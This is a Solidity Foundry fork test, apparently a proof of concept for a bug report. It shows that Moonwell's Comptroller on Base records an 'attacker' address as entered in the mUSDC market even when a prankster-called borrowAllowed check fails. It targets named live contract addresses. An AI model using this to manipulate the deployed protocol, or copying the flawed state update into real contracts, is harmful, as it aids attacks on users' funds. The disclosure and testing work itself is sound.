// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

interface IComptroller {
    function getAssetsIn(address) external view returns (address[] memory);

    function borrowAllowed(
        address mToken,
        address borrower,
        uint256 borrowAmount
    ) external returns (uint256);
}

contract BorrowAllowedDirtyStateFork is Test {
    /// @dev Moonwell Comptroller (Base)
    IComptroller constant comptroller =
        IComptroller(0xfBb21d0380beE3312B33c4353c8936a0F13EF26C);

    /// @dev mUSDC market (Base)
    address constant mUSDC =
        0xEdc817A28E8B93B03976FBd4a3dDBc9f7D176c22;

    address constant attacker = address(0xBEEF);

    function test_marketEntryPersistsDespiteFailedBorrow() public {
        // 1. Initial state: attacker not in any market
        address[] memory assetsBefore =
            comptroller.getAssetsIn(attacker);

        assertEq(
            assetsBefore.length,
            0,
            "attacker must start with no markets"
        );

        // 2. Simulate mToken calling borrowAllowed (as in production)
        vm.prank(mUSDC);

        uint256 errorCode = comptroller.borrowAllowed(
            mUSDC,
            attacker,
            1_000_000e6 // large borrow, expected to fail
        );

        // Borrow must fail
        assertTrue(errorCode != 0, "borrow unexpectedly succeeded");

        // 3. Verify persistent state mutation
        address[] memory assetsAfter =
            comptroller.getAssetsIn(attacker);

        assertEq(
            assetsAfter.length,
            1,
            "market entry should not persist on failed borrow"
        );

        assertEq(
            assetsAfter[0],
            mUSDC,
            "unexpected market entered"
        );
    }
}
